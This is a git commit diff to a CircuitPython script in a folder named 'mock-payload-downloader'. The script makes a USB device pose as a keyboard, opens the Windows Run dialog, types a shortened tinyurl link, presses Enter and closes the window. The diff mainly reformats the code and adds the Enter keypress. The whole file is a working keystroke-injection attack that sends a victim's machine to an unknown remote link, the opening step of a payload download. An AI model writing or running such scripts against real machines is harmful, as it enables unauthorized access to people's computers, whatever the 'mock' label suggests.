52af88b142f177899ee8f15b271dd023bd82b2f6
Chase Manning <cdmanning16@yahoo.com>
2025-04-30 00:13:17 -0400

    Update code.py

--- scripts/mock-payload-downloader/code.py
+++ scripts/mock-payload-downloader/code.py
@@ -7,26 +7,25 @@ import time
 import usb_hid
 import os
 
-
-
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
 
 time.sleep(5)
+
 keyboard = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(keyboard)
-
 
 time.sleep(3)
 
 keyboard.send(Keycode.WINDOWS, Keycode.R)
 
-
 time.sleep(0.5)
+
 layout.write("https://tinyurl.com/3kbb9mpt\n")
 
-
 time.sleep(1)
+
+keyboard.send(Keycode.ENTER)
 keyboard.send(Keycode.CONTROL, Keycode.W)
